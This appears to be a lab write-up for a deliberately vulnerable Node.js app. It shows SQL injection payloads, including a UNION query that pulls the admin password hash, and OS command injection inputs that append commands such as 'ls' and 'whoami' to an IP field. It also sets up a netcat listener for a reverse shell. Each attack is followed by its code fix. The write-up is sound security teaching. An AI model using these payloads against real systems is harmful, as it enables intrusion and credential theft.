# sql Injection
## Exploiting error based SQL injection

### Get the result of first user without knowing any user name with sqli
```
' or '1'='1
```

### Exfiltrate admin password hash
```
' UNION SELECT password,1 from Users where login='admin' -- //
```


## The fix

### Edits to the `core\appHandler.js`

```js
module.exports.userSearch = function (req, res) {
//Comment out the following lines 
	//var query = "SELECT name,id FROM Users WHERE login='" + req.body.login + "'";
	//db.sequelize.query(query, {
	//	model: db.User
	//}).then(user => {
	//	if (user.length) {
		db.User.find({where:{'login':req.body.login}}).then(user => {
			if (user) {
			var output = {
				user: {
					//name: user[0].name,
					//id: user[0].id
					name: user.name,
					id: user.id
				}
			}
			res.render('app/usersearch', {
				output: output
			})
		} else {
			req.flash('warning', 'User not found')
			res.render('app/usersearch', {
				output: null
			})
		}
	}).catch(err => {
		//req.flash('danger', 'Internal Error')
		req.flash('yei', 'Fixed it')
		res.render('app/usersearch', {
			output: null
		})
	})
}
```


---

# OS Command Injection

## Exploiting
##### Intended behaviour
```
Enter a valid IP
8.8.8.8
```
##### Exploiting by appending a OS command 
```
# List the files
8.8.8.8, ls

# Get the effective username of the current user when invoked
8.8.8.8, whoami
```

##### Getting a reverse shell
```
# Start a listener on your public IP
nc -nlvp 4444

# Run the following in vulnerable app function
8.8.8.8, 
```

### The fix
### Edits to the `core\appHandler.js`

```js
// Remove the following line or replace 'exec' with 'execFile'
const exec = require('child_process').exec;

// Add the follwing line 
const execFile = require('child_process').execFile;
```

Then 
```
// Remove/Replace the line 
exec('ping -c 2 ' + req.body.address, function (err, stdout, stderr) {
// Add the line
execFile('ping', ['-c', '2', req.body.address] , function(err,stdout,stderr){
```



